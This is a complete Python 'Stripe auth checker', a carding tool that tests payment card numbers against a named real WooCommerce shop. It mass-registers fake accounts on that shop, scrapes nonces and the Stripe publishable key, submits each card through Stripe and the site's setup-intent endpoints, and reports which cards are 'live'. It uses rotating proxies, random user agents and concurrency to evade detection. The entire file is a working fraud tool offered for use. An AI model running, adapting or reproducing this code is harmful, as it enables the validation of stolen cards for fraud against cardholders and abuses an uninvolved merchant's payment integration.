import asyncio
import re
import json
import random
import aiohttp
from datetime import datetime
import uuid
import warnings
from fake_useragent import UserAgent
from colorama import init, Fore, Style

warnings.filterwarnings('ignore')
init(autoreset=True)

# ────────────────────────── helper functions ──────────────────────────

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ─────────────────────────── proxy parser ────────────────────────────

def parse_proxy_line(line: str) -> str or None:
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url

def load_proxies(file_path: str):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        print(f"{Fore.RED}❌ Proxy file not found: {file_path}")
    return proxies

# ──────────────────────── stripe auth logic ──────────────────────────

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

# ─────────────────────── single card check ───────────────────────────

async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    response_lower = response_msg.lower()
    if 'requires_action' in response_lower or 'succeeded' in response_lower:
        status = f'{Fore.GREEN}✅ Approved'
        is_live = True
    elif is_approved:
        status = f'{Fore.GREEN}✅ Approved'
        is_live = True
    else:
        status = f'{Fore.RED}❌ Declined'
        is_live = False
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'status': status,
        'response': response_msg,
        'is_live': is_live
    }

# ─────────────────────── mass checker ────────────────────────────────

async def mass_check(file_path, proxies=None, concurrency=10):
    if proxies is None:
        proxies = []
    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File not found: {file_path}")
        return []
    if not cc_lines:
        print(f"{Fore.YELLOW}⚠️ No cards to check.")
        return []
    sem = asyncio.Semaphore(concurrency)
    results = []
    completed = 0

    async def worker(cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                return {'cc': cc_line, 'status': f'{Fore.RED}❌ Invalid', 'response': 'Invalid format', 'is_live': False}
            cc, mes, ano, cvv = parts
            proxy = random.choice(proxies) if proxies else None
            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
            completed += 1
            print(f"{Fore.CYAN}[{completed}/{len(cc_lines)}] {result['cc']} → {result['status']}{Style.RESET_ALL} | Response: {result['response']}")
            return result

    tasks = [asyncio.create_task(worker(line)) for line in cc_lines]
    results = await asyncio.gather(*tasks)
    approved = sum(1 for r in results if r['is_live'])
    declined = sum(1 for r in results if not r['is_live'] and 'Invalid' not in r['status'])
    errors = len(results) - approved - declined
    print(f"\n{Fore.MAGENTA}📊 Mass Check Finished 📊{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Approved: {approved}")
    print(f"{Fore.RED}❌ Declined: {declined}")
    print(f"{Fore.YELLOW}⚠️ Invalid/Errors: {errors}")
    return results

# ──────────────────────── interactive menu ──────────────────────────

def print_menu():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════╗
║     💳 STRIPE AUTH CHECKER 💳        ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}1.{Style.RESET_ALL} 🔍 Single Check
{Fore.YELLOW}2.{Style.RESET_ALL} 📁 Mass Check from File
{Fore.YELLOW}3.{Style.RESET_ALL} ⚙️  Proxy Settings
{Fore.YELLOW}4.{Style.RESET_ALL} ❌ Exit
""")

async def main():
    proxies = []
    concurrency = 10

    while True:
        print_menu()
        choice = input(f"{Fore.GREEN}👉 Select option: {Style.RESET_ALL}").strip()

        if choice == '1':
            cc_input = input(f"{Fore.YELLOW}🔸 Enter CC (format: cc|month|year|cvv): {Style.RESET_ALL}").strip()
            parts = cc_input.split('|')
            if len(parts) != 4:
                print(f"{Fore.RED}❌ Invalid format. Use: cc|month|year|cvv{Style.RESET_ALL}")
                continue
            cc, mes, ano, cvv = parts
            proxy = random.choice(proxies) if proxies else None
            print(f"{Fore.CYAN}⏳ Checking...")
            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
            print(f"\n{Fore.MAGENTA}--- RESULT ---{Style.RESET_ALL}")
            print(f"💳 Card: {result['cc']}")
            print(f"📌 Status: {result['status']}")
            print(f"💬 Response: {result['response']}\n")

        elif choice == '2':
            file_path = input(f"{Fore.YELLOW}🔸 Enter path to CC file: {Style.RESET_ALL}").strip()
            use_proxy = input(f"{Fore.YELLOW}🔹 Use proxies? (y/n): {Style.RESET_ALL}").strip().lower()
            if use_proxy == 'y' and not proxies:
                proxy_file = input(f"{Fore.YELLOW}🔸 Enter proxy file path: {Style.RESET_ALL}").strip()
                proxies = load_proxies(proxy_file)
            if use_proxy == 'n':
                proxies = []
            try:
                conc = input(f"{Fore.YELLOW}🔹 Concurrency (default 10): {Style.RESET_ALL}").strip()
                if conc:
                    concurrency = int(conc)
            except:
                concurrency = 10
            print(f"{Fore.CYAN}⚡ Starting mass check...")
            await mass_check(file_path, proxies, concurrency)

        elif choice == '3':
            print(f"\n{Fore.MAGENTA}⚙️  Proxy Settings{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Load new proxy file")
            print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Show loaded proxies ({len(proxies)} loaded)")
            print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Clear proxies")
            print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Back to main menu")
            proxy_choice = input(f"{Fore.GREEN}👉 Choose: {Style.RESET_ALL}").strip()
            if proxy_choice == '1':
                proxy_file = input(f"{Fore.YELLOW}🔸 Proxy file path: {Style.RESET_ALL}").strip()
                loaded = load_proxies(proxy_file)
                proxies = loaded
                print(f"{Fore.GREEN}✅ Loaded {len(proxies)} proxies.")
            elif proxy_choice == '2':
                if not proxies:
                    print(f"{Fore.YELLOW}⚠️ No proxies loaded.")
                else:
                    print(f"{Fore.CYAN}Active proxies ({len(proxies)}):")
                    for p in proxies[:10]:
                        print(f"   {p}")
                    if len(proxies) > 10:
                        print(f"   ... and {len(proxies)-10} more.")
            elif proxy_choice == '3':
                proxies = []
                print(f"{Fore.GREEN}✅ Proxies cleared.")
            elif proxy_choice == '4':
                continue
            else:
                print(f"{Fore.RED}❌ Invalid choice.")

        elif choice == '4':
            print(f"{Fore.GREEN}👋 Goodbye!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}❌ Invalid option. Please select 1-4.{Style.RESET_ALL}")

if __name__ == "__main__":
    asyncio.run(main())